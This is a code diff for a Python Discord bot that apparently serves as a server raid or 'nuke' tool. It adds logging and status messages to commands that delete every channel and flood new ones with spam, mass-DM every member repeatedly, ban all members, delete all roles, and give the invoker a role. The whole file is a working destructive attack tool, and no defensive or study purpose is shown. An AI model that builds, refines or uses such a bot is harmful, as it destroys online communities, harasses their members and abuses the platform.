@@ -4,8 +4,6 @@ from discord.ext import commands
 import asyncio
 from dotenv import load_dotenv
 import os
-import requests
-import json
 
 # config
 load_dotenv()
@@ -40,6 +38,13 @@ async def on_ready():
 
 
 @bot.event
+async def on_command(ctx):
+    print(
+        f"[INFO] {ctx.author.name} has attempted to run command '{config['Prefix']}{ctx.command.name}' in #{ctx.channel.name} - {ctx.guild.name} ({ctx.guild.id})"
+    )
+
+
+@bot.event
 async def on_command_error(ctx, error):
     await ctx.send(error)
     print(f"[ERROR] {error}")
@@ -48,40 +53,51 @@ async def on_command_error(ctx, error):
 # commands
 @bot.command()
 async def nuke(ctx, channelCount, messages, channelName, *, message):
+    await ctx.send("Starting nuke...")
+
     for channel in ctx.guild.channels:
         try:
             await channel.delete()
-            print(f"Deleted channel {channel.name}")
+            print(
+                f"[INFO] Deleted channel {channel.name} in {ctx.guild.name} ({ctx.guild.id})"
+            )
 
         except Exception as error:
-            print(f"Couldn't delete channel {channel.name}: {error}")
+            print(
+                f"[ERROR] Couldn't delete channel {channel.name} in {ctx.guild.name} ({ctx.guild.id}): {error}"
+            )
 
     for i in range(int(channelCount)):
         try:
             channel = await ctx.guild.create_text_channel(name=channelName)
-            print(f"Created text channel: {channelName}")
+            print(
+                f"[INFO] Created text channel '{channelName}' in {ctx.guild.name} ({ctx.guild.id})"
+            )
 
             for j in range(int(messages)):
                 await channel.send(message)
         except Exception as error:
-            print(f"Couldn't create text channel {channelName}: {error}")
+            print(
+                f"Couldn't create text channel {channelName} in {ctx.guild.name} ({ctx.guild.id}): {error}"
+            )
 
 
 @bot.command()
-async def dm(ctx, amount, *, message):
+async def dm(ctx, amount, *, alert):
+    message = await ctx.send("Starting mass DM...")
     for i in range(int(amount)):
         for member in ctx.guild.members:
             try:
-                await member.send(message)
-                print("Sent to {member.display_name} ({member.id}).")
-            except discord.Forbidden:
+                await member.send(alert)
                 print(
-                    f"Couldn't send a message to {member.display_name} ({member.id}). They may have DMs disabled or have blocked the bot."
+                    f"[INFO] Sent message {alert} to {member.display_name} ({member.id})."
                 )
             except Exception as error:
                 print(
-                    f"An error occurred while sending a message to {member.display_name} ({member.id}): {error}"
+                    f"[ERROR] Couldn't send message {alert} to {member.display_name} ({member.id}): {error}"
                 )
+
+    await message.delete()
 
 
 @bot.command()
@@ -91,22 +107,38 @@ async def banall(ctx):
         print("[ERROR] Bot does not have ban permissions")
         return
 
+    message = await ctx.send("Starting mass ban...")
+
     for member in ctx.guild.members:
         try:
             await ctx.guild.ban(member)
+            print(
+                f"[INFO] Succesfully banned user {member.name} ({member.id}) in {ctx.guild.name} ({ctx.guild.id})"
+            )
 
         except Exception as error:
-            print(f"Failed to ban {member}")
+            print(
+                f"[ERROR] Failed to ban {member.name} ({member.id}) in {ctx.guild.name} ({ctx.guild.id}): {error}"
+            )
+
+    await message.delete()
 
 
 @bot.command()
 async def deleteroles(ctx):
+    message = await ctx.send("Starting mass role deletion...")
     for role in ctx.guild.roles:
         try:
             await role.delete()
-            print("Role has been deleted")
+            print(
+                f"[INFO] Administrator role '{role.name}' has been deleted in {ctx.guild.name} ({ctx.guild.id})"
+            )
         except Exception as error:
-            print(f"Failed to delete role")
+            print(
+                f"[ERROR] Failed to delete role {role.name} in {ctx.guild.name} ({ctx.guild.id}): {error}"
+            )
+
+    await message.delete()
 
 
 @bot.command()
@@ -118,9 +150,20 @@ async def hoist(ctx, name):
 
         await ctx.author.add_roles(role)
 
-        print("Role has been added")
+        print(
+            f"[INFO] Role {role.name} has been succesfully given to {ctx.author.name} ({ctx.author.id}) in {ctx.guild.name} ({ctx.guild.id})"
+        )
+
+        message = await ctx.send(
+            f"You have succesfully been given the role <@&{role.id}>"
+        )
+        await asyncio.sleep(3)
+
+        await message.delete()
     except Exception as error:
-        print(f"Failed to give role: {error}")
+        print(
+            f"[ERROR] Failed to give role {role.name} to {ctx.author.name} ({ctx.author.id}) in {ctx.guild.name} ({ctx.guild.id}): {error}"
+        )
 
 
 bot.remove_command("help")
@@ -128,9 +171,12 @@ bot.remove_command("help")
 
 @bot.command()
 async def help(ctx):
-    command_list = [f".{command.name}" for command in bot.commands]
-    commands_text = "\n".join(command_list)
-    await ctx.send(f"Available commands:\n{commands_text}")
+    commands = [f"{config['Prefix']}{command.name}" for command in bot.commands]
+
+    embed = discord.Embed(title="Help", description="Help :3")
+    embed.add_field(name="Commands", value="\n".join(commands))
+
+    await ctx.send(embed=embed)
 
 
 bot.run(TOKEN)
